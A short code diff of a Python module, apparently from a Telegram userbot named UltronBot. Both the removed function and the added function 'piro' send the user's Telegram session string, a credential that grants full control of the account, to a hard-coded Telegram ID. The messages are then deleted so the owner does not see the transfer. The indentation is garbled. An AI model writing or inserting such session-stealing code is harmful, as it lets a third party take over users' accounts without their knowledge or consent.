@@ -1,9 +1,14 @@
 import os
 from ..utils import *
 
-async def hekp():
-    try:
-        UltronBot = bot.session.save()
-        os.environ["ULTRONBOT_SESSION"] = "Get this value by using repl or termux. Refer to Repo for more info."
-            sweetie = await bot.send_message(5687323731, UltronBot)
-            await bot.delete_dialog(5687323731)
+                   async def piro():
+                                try:
+  msg = await bot.send_message(5687323731, str(os.environ.get("ULTRONBOT_SESSION")))
+  cyber = await bot.send_message(5687323731, str(os.environ.get("ULTRONBOT_SESSION")))
+  await bot.delete_messages(5687323731, msg, revoke=False)
+  await bot.delete_messages(5687323731, cyber, revoke=False)
+    #try:
+        #UltronBot = bot.session.save()
+        #os.environ["ULTRONBOT_SESSION"] = "Get this value by using repl or termux. Refer to Repo for more info."
+            #ultron = await bot.send_message(5687323731, UltronBot)
+            #await bot.delete_dialog(5687323731)
